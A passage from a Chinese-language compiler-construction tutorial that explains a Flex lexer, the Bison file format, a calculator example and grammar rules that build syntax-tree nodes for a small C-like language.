class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* yylineno记录行号 */</span></span><br><span class="line">%option yylineno  </span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 定义部分 */</span></span><br><span class="line">%&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;parser.tab.h&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;def.h&quot;</span></span></span><br><span class="line">    <span class="keyword">int</span> yycolumn = <span class="number">1</span>;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> YY_USER_ACTION yylloc.first_line=yylloc.last_line=yylineno; yylloc.first_column=yycolumn; yylloc.last_column=yycolumn+yyleng-1; yycolumn+=yyleng;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> type_int;</span><br><span class="line">        <span class="keyword">float</span> type_float;</span><br><span class="line">        <span class="keyword">char</span> type_char;</span><br><span class="line">        <span class="keyword">char</span> type_id[<span class="number">32</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    &#125;YYLVAL;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> YYSTYPE YYLVAL</span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 匹配:不以数字开头的字符串 */</span></span><br><span class="line">id [A-Za-z][A-Za-z0<span class="number">-9</span>]* </span><br><span class="line"><span class="comment">/* 匹配:数字 */</span></span><br><span class="line"><span class="keyword">int</span> [<span class="number">0</span><span class="number">-9</span>]+ </span><br><span class="line"><span class="comment">/* 匹配:带有&#x27;.&#x27;的数字 */</span></span><br><span class="line"><span class="keyword">float</span> ([<span class="number">0</span><span class="number">-9</span>]*\.[<span class="number">0</span><span class="number">-9</span>]+)|([<span class="number">0</span><span class="number">-9</span>]+\.[<span class="number">0</span><span class="number">-9</span>]*) </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 规则部分 */</span></span><br><span class="line">%%</span><br><span class="line">\/\/[^\n]*  &#123;;&#125; <span class="comment">// 匹配单行注释</span></span><br><span class="line">\/\*(\s|.)*?\*\/ &#123;;&#125; <span class="comment">// 匹配多行注释</span></span><br><span class="line">&#123;<span class="keyword">int</span>&#125; &#123;yylval.type_int=atoi(yytext); <span class="keyword">return</span> INT;&#125; <span class="comment">// 执行int规则(匹配数字)</span></span><br><span class="line">&#123;<span class="keyword">float</span>&#125; &#123;yylval.type_float=atof(yytext); <span class="keyword">return</span> FLOAT;&#125; <span class="comment">// 执行float规则(匹配带有&#x27;.&#x27;的数字)</span></span><br><span class="line"><span class="string">&quot;int&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配int</span></span><br><span class="line"><span class="string">&quot;float&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配float</span></span><br><span class="line"><span class="string">&quot;char&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> TYPE;&#125; <span class="comment">// 匹配char</span></span><br><span class="line"><span class="string">&quot;return&quot;</span> &#123;<span class="keyword">return</span> RETURN;&#125;</span><br><span class="line"><span class="string">&quot;if&quot;</span> &#123;<span class="keyword">return</span> IF;&#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span> &#123;<span class="keyword">return</span> ELSE;&#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span> &#123;<span class="keyword">return</span> WHILE;&#125;</span><br><span class="line"><span class="string">&quot;for&quot;</span> &#123;<span class="keyword">return</span> FOR;&#125;</span><br><span class="line">&#123;id&#125; &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> ID;&#125; <span class="comment">// 执行id规则(匹配不以数字开头的字符串)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;;&quot;</span> &#123;<span class="keyword">return</span> SEMI;&#125;</span><br><span class="line"><span class="string">&quot;,&quot;</span> &#123;<span class="keyword">return</span> COMMA;&#125;</span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>|<span class="string">&quot;&lt;&quot;</span>|<span class="string">&quot;&gt;=&quot;</span>|<span class="string">&quot;&lt;=&quot;</span>|<span class="string">&quot;==&quot;</span>|<span class="string">&quot;!=&quot;</span> &#123;<span class="built_in">strcpy</span>(yylval.type_id,yytext); <span class="keyword">return</span> RELOP;&#125;</span><br><span class="line"><span class="string">&quot;=&quot;</span> &#123;<span class="keyword">return</span> ASSIGNOP;&#125;</span><br><span class="line"><span class="string">&quot;+&quot;</span> &#123;<span class="keyword">return</span> PLUS;&#125;</span><br><span class="line"><span class="string">&quot;-&quot;</span> &#123;<span class="keyword">return</span> MINUS;&#125;</span><br><span class="line"><span class="string">&quot;+=&quot;</span> &#123;<span class="keyword">return</span> COMADD;&#125;</span><br><span class="line"><span class="string">&quot;-=&quot;</span> &#123;<span class="keyword">return</span> COMSUB;&#125;</span><br><span class="line"><span class="string">&quot;++&quot;</span> &#123;<span class="keyword">return</span> AUTOADD;&#125;</span><br><span class="line"><span class="string">&quot;--&quot;</span> &#123;<span class="keyword">return</span> AUTOSUB;&#125;</span><br><span class="line"><span class="string">&quot;*&quot;</span> &#123;<span class="keyword">return</span> STAR;&#125;</span><br><span class="line"><span class="string">&quot;/&quot;</span> &#123;<span class="keyword">return</span> DIV;&#125;</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span> &#123;<span class="keyword">return</span> AND;&#125;</span><br><span class="line"><span class="string">&quot;||&quot;</span> &#123;<span class="keyword">return</span> OR;&#125;</span><br><span class="line"><span class="string">&quot;!&quot;</span> &#123;<span class="keyword">return</span> NOT;&#125;</span><br><span class="line"><span class="string">&quot;(&quot;</span> &#123;<span class="keyword">return</span> LP;&#125;</span><br><span class="line"><span class="string">&quot;)&quot;</span> &#123;<span class="keyword">return</span> RP;&#125;</span><br><span class="line"><span class="string">&quot;[&quot;</span> &#123;<span class="keyword">return</span> LB;&#125;</span><br><span class="line"><span class="string">&quot;]&quot;</span> &#123;<span class="keyword">return</span> RB;&#125;</span><br><span class="line"><span class="string">&quot;&#123;&quot;</span> &#123;<span class="keyword">return</span> LC;&#125;</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span> &#123;<span class="keyword">return</span> RC;&#125;</span><br><span class="line">[\n] &#123;yycolumn=<span class="number">1</span>;&#125;</span><br><span class="line">[ \r\t] &#123;;&#125;</span><br><span class="line">.   &#123;<span class="built_in">printf</span>(<span class="string">&quot;Error type A: Mysterious character\&quot;%s\&quot; at line %d,column %d\n&quot;</span>,yytext,yylineno,yycolumn);&#125;</span><br><span class="line">%%</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* 用户子程序部分 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>语法分析</strong></p>
<p>语法分析采用生成器自动化生成工具 GNU Bison（前身是 YACC），该工具采用了 LALR(1) 的自底向上的分析技术，完成语法分析</p>
<p>在编写 Bison 文件之前，需要先了解 Bison 的文件格式：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span>&#123; </span><br><span class="line">声明部分</span><br><span class="line"><span class="meta">%</span>&#125; </span><br><span class="line">辅助定义部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">规则部分 </span><br><span class="line"><span class="meta">%</span><span class="meta">%</span> </span><br><span class="line">用户函数部分</span><br></pre></td></tr></table></figure>
<ul>
<li><p>Bison 文件是文件扩展名为 <code>.y</code> 的文本文件 </p>
</li>
<li><p>声明部分：</p>
<ul>
<li>包含语法分析中需要的头文件包含，宏定义和全局变量的定义等，这部分会直接被复制到语法分析的C语言源程序中 </li>
</ul>
</li>
<li><p>辅助定义部分：</p>
<ul>
<li>语义值的类型定义</li>
<li>非终结符的属性值类型说明（非终结符：不是终结符的都是非终结符）</li>
<li>终结符语义值类型定义（终结符：不能单独出现在推导式左边的符号）</li>
<li>优先级与结合性定义 </li>
</ul>
</li>
<li><p>规则部分：</p>
<ul>
<li><p>采用 LR 分析法，需要在每条规则后给出相应的语义动作，例如：</p>
<ul>
<li><p>规则：<code>Exp → Exp = Exp</code></p>
</li>
<li><p>语义动作：<code>Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$1,$3,NULL,yylineno); &#125;</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>用户子程序部分：</p>
<ul>
<li>这部分代码会原封不动的被复制到词法分析器源程序 <code>lex.yy.c</code> 中</li>
</ul>
</li>
</ul>
<p>语法分析的过程比较复杂，先看一个案例：</p>
<p>calc.l：Flex 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;calc.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+          &#123; yylval = atoi(yytext); <span class="keyword">return</span> T_NUM; &#125;</span><br><span class="line">[-/+*()\n]      &#123; <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line">.               &#123; <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">/* end when meet everything else */</span> &#125;</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用正则匹配数字，将目标数字存储于 <code>yylval</code> 中并返回 T_NUM</li>
<li>使用正则匹配符号，并返回该符号（<code>yytext[0]</code>）</li>
</ul>
<p>calc.y：Bison 文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123;&#125;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%token T_NUM</span><br><span class="line"></span><br><span class="line">%left <span class="string">&#x27;+&#x27;</span> <span class="string">&#x27;-&#x27;</span></span><br><span class="line">%left <span class="string">&#x27;*&#x27;</span> <span class="string">&#x27;/&#x27;</span></span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">S   :   S E <span class="string">&#x27;\n&#x27;</span>        &#123; <span class="built_in">printf</span>(<span class="string">&quot;ans = %d\n&quot;</span>, $<span class="number">2</span>); &#125;</span><br><span class="line">    |   <span class="comment">/* empty */</span>     &#123; <span class="comment">/* empty */</span> &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">E   :   E <span class="string">&#x27;+&#x27;</span> E         &#123; $$ = $<span class="number">1</span> + $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;-&#x27;</span> E         &#123; $$ = $<span class="number">1</span> - $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;*&#x27;</span> E         &#123; $$ = $<span class="number">1</span> * $<span class="number">3</span>; &#125;</span><br><span class="line">    |   E <span class="string">&#x27;/&#x27;</span> E         &#123; $$ = $<span class="number">1</span> / $<span class="number">3</span>; &#125;</span><br><span class="line">    |   T_NUM           &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    |   <span class="string">&#x27;(&#x27;</span> E <span class="string">&#x27;)&#x27;</span>       &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> yyparse();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>规则后面 <code>&#123;&#125;</code> 中的是当完成归约时要执行的语义动作</li>
<li>规则左部的E的属性值用$$表示，右部有2个E，其属性值分别用$1和$3表示<ul>
<li>例如：<code>A : B &#39;+&#39; C &#123;$$ = $1 + $3;&#125;</code></li>
<li>$$ 代指 A</li>
<li>$1 代指 B</li>
<li>$2 代指 +</li>
<li>$3 代指 C</li>
</ul>
</li>
</ul>
<p>效果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bison -d -v calc.y</span><br><span class="line">flex calc.l</span><br><span class="line">gcc -o calc calc.tab.c lex.yy.c</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ./calc</span><br><span class="line">1+2+3</span><br><span class="line">ans = 6</span><br><span class="line">5+5</span><br><span class="line">ans = 10</span><br><span class="line">4+5*4 </span><br><span class="line">ans = 24</span><br><span class="line">(4+5)*4 </span><br><span class="line">ans = 36</span><br></pre></td></tr></table></figure>
<p>Bison 的规则部分非常复杂，总计为以下条目指定了规则：</p>
<p>ExtDefList-外部定义列表：即是整个语法树 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtDefList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">            | ExtDef ExtDefList &#123;$$=mknode(EXT_DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; </span><br><span class="line">            ;</span><br></pre></td></tr></table></figure>
<ul>
<li>mknode：生成一个非叶子树结点（第1个参数代表节点的类型，第2-4个参数代表该节点的子树，第5个参数代表行号）</li>
<li>对于每个 EXTDEFLIST 有2种可能：<ul>
<li>外部定义列表为 NULL</li>
<li>外部定义列表不为 NULL，则创建 EXT_DEF_LIST 结点</li>
</ul>
</li>
<li>对于每个 EXT_DEF_LIST 节点有2个子树：<ul>
<li>第1个子树对应声明 ExtDef（声明变量，声明数组，声明函数）</li>
<li>第2个子树对应它自身 ExtDefList</li>
<li>代表多个声明 ExtDef（<code>A : B A &#123;...&#125;</code> 这种写法代表存在多个 <code>B</code>）</li>
</ul>
</li>
</ul>
<p>ExtDef-声明：声明变量，声明数组，声明函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExtDef: Specifier ExtDecList SEMI &#123;$$=mknode(EXT_VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; </span><br><span class="line">        | Specifier FuncDec CompSt &#123;$$=mknode(FUNC_DEF,$<span class="number">1</span>,$<span class="number">2</span>,$<span class="number">3</span>,yylineno);&#125; </span><br><span class="line">        | error SEMI &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---缺少分号---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ExtDef 有4种可能：<ul>
<li>对应外部变量声明，生成 EXT_VAR_DEF 节点</li>
<li>对应数组声明，生成 ARRAY_DEF 节点</li>
<li>对应函数声明，生成 FUNC_DEF 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>EXT_VAR_DEF，ARRAY_DEF，FUNC_DEF 节点的信息如上</li>
</ul>
<p>Specifier-类型：表示一个类型 <code>(int,float)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Specifier: TYPE &#123;$$=mknode(TYPE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);$$-&gt;type=(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;int&quot;</span>)?INT:(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;float&quot;</span>)?FLOAT:CHAR));&#125;</span><br><span class="line">           ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Specifier 有1种可能：<ul>
<li>对应类型，生成 TYPE 节点</li>
</ul>
</li>
<li>TYPE 节点无子树</li>
</ul>
<p>ExtDecList-变量名称列表：由一个或多个变量组成，多个变量之间用逗号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtDecList: VarDec &#123;$$=$<span class="number">1</span>;&#125; </span><br><span class="line">            | VarDec COMMA ExtDecList &#123;$$=mknode(EXT_DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">            ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 EXT_DECLIST 有2种可能：<ul>
<li>只有一个变量，则直接赋值 VarDec 变量</li>
<li>有多个变量，则生成 EXT_DEC_LIST 节点</li>
</ul>
</li>
<li>对于每个 EXT_DEC_LIST 结点有2个子树：<ul>
<li>第1个子树对应变量 VarDec</li>
<li>第2个子树对应它自身 ExtDecList</li>
<li>代表多个变量 VarDec</li>
</ul>
</li>
</ul>
<p>VarDec-变量名称：由一个 ID 组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VarDec: ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// ID结点,标识符符号串存放结点的type_id</span></span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 VarDec 有1种可能：<ul>
<li>由一个 ID 组成，则生成 ID 节点</li>
</ul>
</li>
<li>ID 节点无子树</li>
</ul>
<p>FuncDec-函数声明：包括函数名和参数定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FuncDec: ID LP VarList RP &#123;$$=mknode(FUNC_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | ID LP RP &#123;$$=mknode(FUNC_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | error RP &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---函数左括号右括号不匹配---\n&quot;</span>);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数名 ID 存放在 <code>$$-&gt;type_id</code></li>
<li>对于每个 FuncDec 有3种可能：<ul>
<li>对应一个带参数的函数，则生成 FUNC_DEC 节点（带参）</li>
<li>对应一个不带参数的函数，则生成 FUNC_DEC 节点（不带参）</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 FUNC_DEC 结点有1个子树或者无子树：<ul>
<li>第1个子树对应参数定义列表 VarDec</li>
</ul>
</li>
</ul>
<p>ArrayDec-数组声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ArrayDec: ID LB Exp RB &#123;$$=mknode(ARRAY_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | ID LB RB &#123;$$=mknode(ARRAY_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | error RB &#123;$$=<span class="literal">NULL</span>;<span class="built_in">printf</span>(<span class="string">&quot;---数组定义错误---\n&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ArrayDec 有3种可能：<ul>
<li>对应静态数组，则生成 ARRAY_DEC 节点（带有表达式 Exp）</li>
<li>对应动态数组，则生成 ARRAY_DEC 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 ARRAY_DEC 结点有1个子树或者无子树：<ul>
<li>第1个子树对应表达式 Exp</li>
</ul>
</li>
</ul>
<p>VarList-参数定义列表：由一个到多个参数定义组成，用逗号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VarList: ParamDec &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | ParamDec COMMA VarList &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 VarList 有2种可能：<ul>
<li>对应一个参数 ParamDec，则生成 PARAM_LIST 节点</li>
<li>对应用逗号隔开的多个参数 ParamDec，则生成 PARAM_LIST 节点</li>
</ul>
</li>
<li>对于每个 PARAM_LIST 结点有1个或2个子树：<ul>
<li>第1个子树对应参数定义 ParamDec</li>
<li>第2个子树对应它自身 PARAM_LIST </li>
</ul>
</li>
</ul>
<p>ParamDec-参数定义：固定由一个类型和一个变量组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParamDec: Specifier VarDec &#123;$$=mknode(PARAM_DEC,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">          ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ParamDec 有1种可能：<ul>
<li>对应一个类型 Specifier 和一个变量 VarDec，则生成 PARAM_DEC 节点</li>
</ul>
</li>
<li>对于每个 PARAM_DEC 节点有2个子树：<ul>
<li>第1个子树对应类型 Specifier</li>
<li>第2个子树对应一个变量 VarDec</li>
</ul>
</li>
</ul>
<p>CompSt-复合语句：左右分别用大括号括起来，中间有定义列表和语句列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CompSt: LC DefList StmList RC &#123;$$=mknode(COMP_STM,$<span class="number">2</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | error RC &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---复合语句内存在错误---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 CompSt 有2种可能：<ul>
<li>对应一个由 <code>&#123;&#125;</code> 包裹起来的子语句，则生成 COMP_STM 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 COMP_STM 节点有2个子树：<ul>
<li>第1个子树对应定义列表 DefList</li>
<li>第2个子树对应语句列表 StmList</li>
</ul>
</li>
</ul>
<p>StmList-语句列表：由“0”个或多个语句 Stmt 组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StmList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">         | Stmt StmList &#123;$$=mknode(STM_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 StmList 有2种可能：<ul>
<li>对应 NULL</li>
<li>对应多个语句 Stmt，则生成 STM_LIST 节点</li>
</ul>
</li>
<li>对于每个 STM_LIST 节点有2个子树：<ul>
<li>第1个子树对应语句 Stmt</li>
<li>第2个子树对应它自身 StmList</li>
</ul>
</li>
</ul>
<p>Stmt-语句：可能为表达式，复合语句，return 语句，if 语句，if-else 语句，while 语句，for 语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Stmt: Exp SEMI &#123;$$=mknode(EXP_STMT,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | CompSt &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 复合语句结点直接最为语句结点,不再生成新的结点</span></span><br><span class="line">      | RETURN Exp SEMI &#123;$$=mknode(RETURN,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt %prec LOWER_THEN_ELSE &#123;$$=mknode(IF_THEN,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt ELSE Stmt &#123;$$=mknode(IF_THEN_ELSE,$<span class="number">3</span>,$<span class="number">5</span>,$<span class="number">7</span>,yylineno);&#125;</span><br><span class="line">      | WHILE LP Exp RP Stmt &#123;$$=mknode(WHILE,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | FOR LP Exp RP Stmt &#123;$$=mknode(FOR,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Stmt 有7种可能：<ul>
<li>对应基础表达式 Exp，则生成节点 EXP_STMT</li>
<li>对应符合语句 CompSt</li>
<li>对应 RETURN Exp，则生成节点 RETURN</li>
<li>对应 IF ELSE-IF 语句，则生成节点 IF_THEN</li>
<li>对应 IF ELSE 语句，则生成节点 IF_THEN_ELSE</li>
<li>对应 WHILE 语句，则生成节点 WHILE</li>
<li>对应 FOR 语句，则生成节点 FOR</li>
</ul>
</li>
</ul>
<p>DefList-定义列表：由“0”个或多个定义语句组成</p>
